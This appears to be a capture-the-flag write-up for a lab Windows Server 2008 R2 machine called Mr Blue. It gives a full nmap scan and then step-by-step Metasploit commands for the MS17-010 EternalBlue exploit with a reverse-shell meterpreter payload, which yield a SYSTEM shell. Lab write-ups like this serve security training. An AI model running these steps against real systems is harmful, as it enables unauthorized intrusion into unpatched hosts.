<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 10.150.150.242 -p- -T4 -v

```
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 13:22 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
Initiating Ping Scan at 13:22
Scanning 10.150.150.242 [2 ports]
Completed Ping Scan at 13:22, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:22
Completed Parallel DNS resolution of 1 host. at 13:22, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:22
Scanning 10.150.150.242 [17 ports]
Discovered open port 80/tcp on 10.150.150.242
Discovered open port 3389/tcp on 10.150.150.242
Discovered open port 139/tcp on 10.150.150.242
Discovered open port 135/tcp on 10.150.150.242
Discovered open port 445/tcp on 10.150.150.242
Discovered open port 53/tcp on 10.150.150.242
Discovered open port 49153/tcp on 10.150.150.242
Discovered open port 8089/tcp on 10.150.150.242
Discovered open port 49156/tcp on 10.150.150.242
Discovered open port 47001/tcp on 10.150.150.242
Discovered open port 49154/tcp on 10.150.150.242
Discovered open port 49158/tcp on 10.150.150.242
Discovered open port 49157/tcp on 10.150.150.242
Discovered open port 1433/tcp on 10.150.150.242
Discovered open port 49197/tcp on 10.150.150.242
Discovered open port 49152/tcp on 10.150.150.242
Discovered open port 49155/tcp on 10.150.150.242
Completed Connect Scan at 13:22, 0.46s elapsed (17 total ports)
Initiating Service scan at 13:22
Scanning 17 services on 10.150.150.242
Service scan Timing: About 47.06% done; ETC: 13:23 (0:00:42 remaining)
Completed Service scan at 13:24, 123.89s elapsed (17 services on 1 host)
NSE: Script scanning 10.150.150.242.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:24
NSE Timing: About 99.83% done; ETC: 13:24 (0:00:00 remaining)
Completed NSE at 13:25, 59.24s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:25
Completed NSE at 13:25, 2.12s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:25
Completed NSE at 13:25, 0.00s elapsed
Nmap scan report for 10.150.150.242
Host is up, received syn-ack (0.23s latency).
Scanned at 2023-03-06 13:22:23 WAT for 186s

PORT      STATE SERVICE            REASON  VERSION
53/tcp    open  domain             syn-ack Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB1446A)
80/tcp    open  http               syn-ack Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
1433/tcp  open  ms-sql-s           syn-ack Microsoft SQL Server 2012 11.00.2100.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-03-06T13:04:25+00:00; +38m57s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-03-25T14:11:19
| Not valid after:  2050-03-25T14:11:19
| MD5:   61688dc879c85e9a96206f0fde6af664
| SHA-1: 39eb98b30b8c2ffddba3550971d5489ad5e17f2b
| -----BEGIN CERTIFICATE-----
| MIIB+zCCAWSgAwIBAgIQGgKJh2erxaZPhJETldHQTzANBgkqhkiG9w0BAQUFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjAwMzI1MTQxMTE5WhgPMjA1MDAzMjUxNDExMTlaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAyzoqpiUyYjbe
| +b7XOpSgMc7/gOb/8qSfGWpyNwA81OG5O34ZSz6j8DsCM28OHBtgxbZNUJ+sJpb4
| aaB0LE9CC56KJbE0ad2xlit9lOmM+4jCoj86aEiU6ElISFYFAJbQA9wBLlg6zibn
| v5fgSXWrnc36sJ3NntyNoQK7jkdVxp8CAwEAATANBgkqhkiG9w0BAQUFAAOBgQA+
| ke3/xo0GlZBKIkXXOdHLEllUIB7hNooSYCKu8epbWok/qWSbDTZ6Oxoc5RUWtEM/
| I4Wmm0aOSEb/3NQ9vXJUt60KSr8R5GpFqVNrcdVQMutOLfXCZZ0+IrOOf3R7bo5M
| Q0CG0zih1UtSg/XCn44BMKW/BBKxNp1cghdcC3mszw==
|_-----END CERTIFICATE-----
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_ssl-date: 2023-03-06T13:04:25+00:00; +38m57s from scanner time.
| ssl-cert: Subject: commonName=MrBlue
| Issuer: commonName=MrBlue
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-03-05T12:16:41
| Not valid after:  2023-09-04T12:16:41
| MD5:   49bf4900b1b862cf9ab8f9b0d6868e11
| SHA-1: 51a4b866ee2461af4303127d4041a2b0ab6c3007
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQNleZqTEvE5RHai8uyEqv/jANBgkqhkiG9w0BAQUFADAR
| MQ8wDQYDVQQDEwZNckJsdWUwHhcNMjMwMzA1MTIxNjQxWhcNMjMwOTA0MTIxNjQx
| WjARMQ8wDQYDVQQDEwZNckJsdWUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQCYdzoDs9I4Xm2TYcZHKxhIAZDoU+SvM1f22VYKlUgK+eu7C32dBsoTTRbN
| fk05UjY2mIEcYv59jl9EyoImsvu/wnXOWCdDiBvK75HzQmLZ1CLiXdtlWQ6D9wlM
| vZwHDHTNO0hXLZsvhU6jeXkRrSaN0zz19bCe9wJWuTIGWpbjkIil6J9JWOoCNtgR
| dUG9L0ayWjqM6cA8OsnVYYOrI1u5v+z0SDZPEjwCjFcSBSHeQkA/sHbBLU2/sWIy
| nksO6Lu614TmAIa0ij4xWB9ZQ2ksMw8BcGxi/YLFvFBk9CbtJ77FwwgYsk8OOOxD
| xNvB0a/IZqAGKxurtcnoqfuuYTWvAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEAfSEOOZe35hQzIr9Q
| mFpl9bAxWH/ib8Ee7WU0ThdCCQuA2npNbRD8DH+TUXPJHk+18oeyENxJY67ALIh7
| r7Wt4YjuZ0W7LJjWSp/QXuGvtdzLZqTbOb2VuIRyIlP+tX5zr74HUUhgcwohbDvK
| cHh2y77BlJosdfl4fenhw0D37ZDXyiS5Og/FU3fcEIEOgDlJ30P8RoRj4tDSf/+z
| VFQ/X/QHyeed/MMeEZ+IxM6FMp/vkjXrsCwAxbG4PN1GrTjuxGSp29F6/Zm+v6S5
| yi3/ZIjd/j2wyK8ASGxGRAqIabgdPnSVk70hPTimvButvRWmmiW3p/wi6N2U/Zny
| lqxvcg==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: MRBLUE
|   NetBIOS_Domain_Name: MRBLUE
|   NetBIOS_Computer_Name: MRBLUE
|   DNS_Domain_Name: MrBlue
|   DNS_Computer_Name: MrBlue
|   Product_Version: 6.1.7601
|_  System_Time: 2023-03-06T13:03:27+00:00
8089/tcp  open  ssl/http           syn-ack Splunkd httpd
|_http-server-header: Splunkd
| http-methods: 
|_  Supported Methods: HEAD OPTIONS
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-10-25T09:53:52
| Not valid after:  2022-10-24T09:53:52
| MD5:   e91c7851211d939d7b0579b7f700c3ab
| SHA-1: 42c1a48058956b965e7b21b5ac94c815995aae6f
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQD+w83FEULtUTANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0xOTEwMjUwOTUzNTJaFw0yMjEwMjQwOTUz
| NTJaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqFPI
| 1+JiB6oBZ0WOMVECFKkdWJ9s7kJrqEJlC2YTBP0WcFQnzh6RlqBB2Szdcq7WwImp
| oAkfERO3+lcJZFIkq5XpcWuOzSj8RUoTxxL4DxZzvOV2ofYf7LSytvFOOnFI8epA
| JaVzvwsGtb4o0VgwN4XxFYhEvomkN98gn1aKOGKJ+4fRlYS++pdImrv6sDeO1Y/h
| MavLScws05ZXl9JzwssH/5DfZWGPwbV1y+mE4smHyf+EZDYRPDssjYN1JP7Hzflm
| r1vmPr6rC4KaW1v8wJ8Gh6sESZu6FTpsdU4O1/k3XZvpXdPXqMmn0/o/zUWxvJSY
| Mu071XycOQdCjsiuCQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQAJI9/S8mDmQID5
| YElAFZmwQ8Q9I1Ix7MiXeHpdliV9zOY6XUKQpFclJDRoUBQwnzOcoueHT9atoxe2
| GbbLXfA4Mqpb0XaVsoj5EvIZI+NpPfa8Su+XjdasSjm47Xc1eMBQ46zTLSo4/HSL
| vpU5lY6BwnMjQnneV2Bav2wAi69PDRYBqEBxoYV3qJmhK4V1MbnhthBdwc0CB1L5
| 4JEoHtRvYXJIfncaLCvvnaY45DlaRZjQlBAsTxDZ9ZNiSrdjngpLsLwHZZGH6Jzh
| qBhk87QuBbdLwe37nmQxJZJK8LgdbS6ITk5XNkRcJYeAnGNeUhqHHKE027JXibwE
| tmX7IzuM
|_-----END CERTIFICATE-----
47001/tcp open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  unknown            syn-ack
49154/tcp open  unknown            syn-ack
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack Microsoft Windows RPC
49157/tcp open  unknown            syn-ack
49158/tcp open  unknown            syn-ack
49197/tcp open  unknown            syn-ack
Service Info: Host: MRBLUE; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: MrBlue
|   NetBIOS computer name: MRBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-06T13:03:28+00:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 7646/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 62483/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 13502/udp): CLEAN (Failed to receive data)
|   Check 4 (port 26701/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2023-03-06T13:03:30
|_  start_date: 2020-03-25T14:11:23
| nbstat: NetBIOS name: MRBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 000c29ab4629 (VMware)
| Names:
|   MRBLUE<20>           Flags: <unique><active>
|   MRBLUE<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   000c29ab46290000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
|_clock-skew: mean: 38m57s, deviation: 1s, median: 38m56s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:25
Completed NSE at 13:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:25
Completed NSE at 13:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:25
Completed NSE at 13:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.51 seconds
```
We have 9 opened ports here. We'll be starting our enumeration from port 80.



<h2>Enumeration Port 80</h2>

Going to the webpage, you should see this

![image](https://user-images.githubusercontent.com/67879936/223111781-17a70229-272f-431d-8fb8-3196d0fb9585.png)

Lets check the source page of this webpage

![image](https://user-images.githubusercontent.com/67879936/223111929-32289f9b-7448-496d-8160-682df9a3086e.png)

```MS17-010```, was curious what this means

><font color="Green">MS17-010 is a security vulnerability in Microsoft Windows operating systems that was discovered in March 2017. The vulnerability is specifically a flaw in the Microsoft Server Message Block (SMB) protocol, which is used for file sharing and communication between computers on a network.</font>

Lets look for exploits

![image](https://user-images.githubusercontent.com/67879936/223113566-9e9ec85d-20f2-49f7-82bd-0703d2c46e39.png)

cool, we found one. Lets go ahead and exploit this vulnerability.



<h2>Exploitation</h2>

We'll be using metasploit in this case, I actually tried the manual exploits, I haven't gotten it yet. As soon as I get it I'll post it here. But for now lets use metasploit

>command: msfconsole

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/mr_blue/AutoBlue-MS17-010]
└─$ msfconsole                                                                            
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+


       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: When in a module, use back to go 
back to the top level prompt

msf6 > 
```
cool, now we'll be typing these commands in

```
search ms17-010
use 0
options
set LHOST <Your IP>
set RHOST <Target's IP>
options
run
```

```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded
                                              Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Sta
                                             ndard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 ta
                                             rget machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.43.196   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.66.67.154
LHOST => 10.66.67.154
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.150.150.242
RHOST => 10.150.150.242
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.150.150.242   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded
                                              Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Sta
                                             ndard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 ta
                                             rget machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.66.67.154     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

![image](https://user-images.githubusercontent.com/67879936/223118896-d55c7761-22de-4fd2-b5e5-67bff81e6f26.png)

![image](https://user-images.githubusercontent.com/67879936/223119019-6bd73763-c306-4012-b412-849a689360ba.png)

Boom!!! We got a shell as ```nt Authority\System```. Found the flag in ```C:\Users\Administrator.GNBUSCA-W054\Desktop```.

![image](https://user-images.githubusercontent.com/67879936/223119865-417dab1f-c803-48fc-ab8a-d0b79275cb9f.png)

That will be all for today
<br> <br>
[Back To Home](../../index.md)

















